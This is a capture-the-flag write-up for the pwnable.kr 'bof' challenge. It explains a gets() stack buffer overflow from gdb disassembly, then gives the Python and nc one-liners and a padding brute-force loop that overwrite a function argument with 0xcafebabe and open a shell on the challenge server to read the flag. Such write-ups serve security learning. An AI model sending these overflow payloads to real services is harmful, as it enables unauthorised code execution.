---

title: bof
link: nc pwnable.kr 9000

---

Download : http://pwnable.kr/bin/bof & http://pwnable.kr/bin/bof.c

Examining the binary with `gdb` we can suspect that the following will append:

    Dump of assembler code for function func:
       ...
       0x00001eac <+12>:    mov    0x8(%ebp),%ecx
       0x00001eaf <+15>:    lea    0xe7(%eax),%edx
       0x00001eb5 <+21>:    mov    %ecx,-0x4(%ebp)          " Save the value of the function argument to ecx, 0xdeadbeef
                                                            " is at $ebp-0x4
       ...
       0x00001ec3 <+35>:    lea    -0x24(%ebp),%ecx         " $ebp-0x24 will contains the result of the gets
       0x00001ec6 <+38>:    mov    %ecx,(%esp)              " Put this address on the stack for gets to use
       ...
       0x00001ecc <+44>:    call   0x1f54
       0x00001ed1 <+49>:    cmpl   $0xcafebabe,-0x4(%ebp)   " Compare the argument of the function with 0xcafebabe
       ....

So there is a 0x20 difference between the buffer and the function argument. Indeed if we try that:

    $ cat <(python -c "print 'a'*32 + '\xbe\xba\xfe\xca'") - | ./bof
    warning: this program uses gets(), which is unsafe.
    ls
    bof             bof.c

But using the same method with the remote service doesn't work:


    $ echo $(python -c "print 'a'*32 + '\xbe\xba\xfe\xca'") | nc pwnable.kr 9000
    *** stack smashing detected ***: /home/bof/bof terminated
    overflow me :
    Nah..

That must be because the service doesn't use exactly the same OS, thus the memory management will be sligthly different. We can gess though the right number of padding needed with a little loop:


    $ for i in $(seq 40 64); do; echo $i; echo $(python -c "print 'a'*$i + '\xbe\xba\xfe\xca'") | nc pwnable.kr 9000 | grep Nah; done
    ...
    51
    Nah..
    52
    53
    Nah..
    ...

Ah! 52 didn't yield a 'Nah..', it's the good padding to apply:

    $ cat <(python -c "print 'a'*52 + '\xbe\xba\xfe\xca'") - | nc pwnable.kr 9000
    ls
    bof
    bof.c
    flag
    log
    log2
    super.pl
    cat flag
    daddy, I just pwned a buFFer :)

> daddy, I just pwned a buFFer :)
